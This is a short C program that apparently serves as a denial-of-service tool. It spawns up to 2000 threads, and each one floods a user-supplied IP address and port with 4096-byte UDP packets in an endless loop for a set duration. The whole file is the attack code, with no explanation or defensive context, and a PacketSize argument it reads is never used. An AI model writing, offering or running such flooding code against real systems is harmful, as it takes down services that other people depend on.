
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

#define PACKET_SIZE 4096
#define MAX_THREADS 2000

void *flood(void *arg) {
    char *target_ip = ((char **)arg)[0];
    int target_port = atoi(((char **)arg)[1]);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in target_addr = {0};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    char packet[PACKET_SIZE];
    memset(packet, rand() % 256, PACKET_SIZE);

    while (1) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <Port> <Duration> <PacketSize> <ThreadCount>\n", argv[0]);
        return 1;
    }

    int thread_count = atoi(argv[5]);
    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < thread_count; ++i) {
        pthread_create(&threads[i], NULL, flood, argv + 1);
    }

    sleep(atoi(argv[3]));
    return 0;
}
